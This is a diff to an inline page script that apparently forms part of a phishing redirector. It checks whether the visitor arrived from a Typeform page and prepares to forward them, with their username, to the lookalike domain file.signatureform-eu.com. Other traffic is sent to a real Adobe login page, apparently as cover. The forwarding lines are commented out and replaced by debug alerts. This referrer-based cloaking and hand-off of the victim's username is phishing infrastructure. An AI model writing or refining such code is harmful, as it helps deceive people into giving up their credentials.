@@ -1,4 +1,5 @@
 <script>
+  const ref = document.referrer;
   const qs = window.location.search;
   const urlParams = new URLSearchParams(qs);
 
@@ -14,13 +15,23 @@
       // redirect to end site
       window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
     } else {
+
+      if (ref.match(/^https?:\/\/([^\/]+\.)?form.typeform\.com(\/|$)/i)) {
+        alert("Came from typeform");
+
         if (urlParams.has("u")) {
-        const u = urlParams.get("u");
-        /// window.location = "https://file.signatureform-eu.com/?username=" + u;
-      } else {
-        alert("hi");
-        // window.location = "https://file.signatureform-eu.com";
+          const u = urlParams.get("u");
+          /// window.location = "https://file.signatureform-eu.com/?username=" + u;
+        } else {
+          alert("hi");
+          // window.location = "https://file.signatureform-eu.com";
+        }
+      } 
+
+      else {
+        alert ("came direct");
       }
+        
     }
   }
 
